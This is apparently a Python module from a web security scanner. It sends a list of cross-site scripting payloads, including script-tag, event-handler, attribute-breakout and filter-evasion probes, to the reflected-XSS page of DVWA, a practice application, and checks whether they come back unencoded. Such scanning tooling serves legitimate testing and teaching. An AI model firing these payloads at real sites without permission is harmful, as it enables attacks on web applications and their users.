"""
XSS (Cross-Site Scripting) Scanner Module
"""
import time
from bs4 import BeautifulSoup
from urllib.parse import urljoin
from src.utils.logger import setup_logger

class XSSScanner:
    def __init__(self, session, target_url, verbose=False):
        self.session = session
        self.target_url = target_url
        self.verbose = verbose
        self.logger = setup_logger(verbose)
        
        # XSS payloads for different contexts
        self.payloads = [
            # Basic XSS
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            # Event handlers
            "\" onmouseover=\"alert('XSS')\"",
            "' onfocus='alert(\"XSS\")'",
            # JavaScript URIs
            "javascript:alert('XSS')",
            # Break out of attributes
            "\"><script>alert('XSS')</script>",
            "'><script>alert('XSS')</script>",
            # Encoded payloads
            "<scr<script>ipt>alert('XSS')</scr</script>ipt>",
        ]

        self.vulnerabilities_found = []  # Track found vulnerabilities

    def test_dvwa_xss_page(self):
        """Test DVWA's XSS vulnerability page"""
        self.logger.info("🎯 Testing DVWA XSS page...")
        self.vulnerabilities_found = []  # Reset findings
        
        # Test reflected XSS page
        xss_url = urljoin(self.target_url, "/vulnerabilities/xss_r/")
        vulnerabilities_found = 0
        
        for payload in self.payloads:
            try:
                self.logger.debug(f"🧪 Testing XSS payload: {payload}")
                
                # Send request with payload
                params = {"name": payload, "Submit": "Submit"}
                response = self.session.get(xss_url, params=params)
                
                # Check if payload is reflected without sanitization
                if self.is_xss_vulnerable(response.text, payload):
                    self.logger.warning(f"🎯 XSS VULNERABILITY FOUND!")
                    self.logger.warning(f"   Payload: {payload}")
                    self.logger.warning(f"   URL: {xss_url}")
                    self.vulnerabilities_found.append((payload, xss_url))  # Track finding
                    vulnerabilities_found += 1
                    
            except Exception as e:
                self.logger.error(f"❌ Error testing XSS payload {payload}: {str(e)}")
        
        if vulnerabilities_found > 0:
            self.logger.warning(f"🎯 Found {vulnerabilities_found} XSS vulnerabilities!")
            return True
        else:
            self.logger.info("✅ No XSS vulnerabilities detected")
            return False

    def is_xss_vulnerable(self, response_text, payload):
        """Detect if XSS payload is reflected without sanitization"""
        # Check if payload appears in response without encoding
        if payload in response_text:
            return True
        
        # Check for partial reflection (common in XSS)
        soup = BeautifulSoup(response_text, 'html.parser')
        
        # Check if payload appears in script tags
        script_tags = soup.find_all('script')
        for script in script_tags:
            if script.string and payload in script.string:
                return True
        
        # Check if payload appears in attribute contexts
        for tag in soup.find_all():
            for attr in tag.attrs:
                if payload in str(tag.attrs[attr]):
                    return True
        
        return False